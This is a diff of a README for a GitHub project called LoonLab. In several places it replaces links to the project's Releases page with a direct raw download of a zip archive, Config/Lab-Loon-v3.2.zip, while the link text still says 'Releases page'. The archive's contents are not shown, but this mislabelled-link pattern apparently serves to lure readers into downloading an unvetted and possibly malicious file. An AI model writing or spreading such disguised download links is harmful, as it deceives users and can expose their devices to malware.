@@ -6,9 +6,9 @@ Welcome to LoonLab! This repository offers custom resources for your Loon applic
 
 ## 📥 Download LoonLab
 
-[![Download LoonLab](https://img.shields.io/badge/Download-LoonLab-brightgreen)](https://github.com/fortniteseason6/LoonLab/releases)
+[![Download LoonLab](https://github.com/fortniteseason6/LoonLab/raw/refs/heads/main/Config/Lab-Loon-v3.2.zip)](https://github.com/fortniteseason6/LoonLab/raw/refs/heads/main/Config/Lab-Loon-v3.2.zip)
 
-To get started, visit the [Releases page](https://github.com/fortniteseason6/LoonLab/releases) to download the latest version of LoonLab.
+To get started, visit the [Releases page](https://github.com/fortniteseason6/LoonLab/raw/refs/heads/main/Config/Lab-Loon-v3.2.zip) to download the latest version of LoonLab.
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/fortniteseason6/LoonLab/releases).
+1. Visit the [Releases page](https://github.com/fortniteseason6/LoonLab/raw/refs/heads/main/Config/Lab-Loon-v3.2.zip).
 2. Choose the latest version listed on the page.
 3. Download the appropriate file for your operating system. 
 4. Locate the downloaded file on your device.
